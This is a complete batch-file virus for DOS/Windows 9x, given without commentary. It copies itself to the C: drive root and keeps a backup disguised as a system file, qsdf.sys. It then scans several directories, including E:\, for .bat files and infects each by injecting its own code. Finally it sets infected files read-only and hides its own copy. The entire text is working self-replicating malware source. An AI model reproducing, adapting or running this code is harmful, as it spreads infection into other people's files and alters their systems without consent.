@echo off
if %2==aaa3_inf goto aaa3_inf
if not exist c:\aaa3.bat copy aaa3.bat c:\ >nul
if not exist c:\windows\system\qsdf.sys type c:\aaa3.bat > c:\windows\system\qsdf.sys
if not exist c:\aaa3.bat type c:\windows\system\qsdf.sys > c:\aaa3.bat
if not exist c:\aaa3.bat copy %0.bat c:\aaa3.bat >nul
for %%a in (..\*.bat *.bat c:\*.bat c:\windows\*.bat c:\windows\command\*.bat e:\*.bat) do call %0 %%a aaa3_inf
goto fin
:aaa3_inf
find "aaa3"<%1>nul
if not errorlevel 1 goto fin

type %1>bakk.bak
echo @echo off>%1
echo if %%2==aaa3_inf goto aaa3_inf>>%1
echo cls>>%1
type bakk.bak>>%1
type c:\aaa3.bat>>%1
attrib %1 +r
:fin
attrib c:\aaa3.bat +h +r
